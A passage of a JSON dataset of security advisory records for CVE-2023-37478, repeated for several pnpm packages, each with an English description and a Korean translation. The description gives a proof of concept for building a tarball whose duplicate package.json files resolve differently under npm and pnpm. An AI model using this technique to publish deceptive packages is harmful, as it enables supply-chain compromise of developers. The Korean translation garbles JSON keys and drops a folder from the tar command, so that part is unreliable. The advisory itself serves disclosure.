    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/linux-x64",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 8.0.0, < 8.6.8",
    "identifier": "8.6.8",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/linux-arm64",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 8.0.0, < 8.6.8",
    "identifier": "8.6.8",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/exe",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 8.0.0, < 8.6.8",
    "identifier": "8.6.8",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "pnpm",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 8.0.0, < 8.6.8",
    "identifier": "8.6.8",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/cafs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.0.5",
    "identifier": "7.0.5",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/win-x64",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.33.4",
    "identifier": "7.33.4",
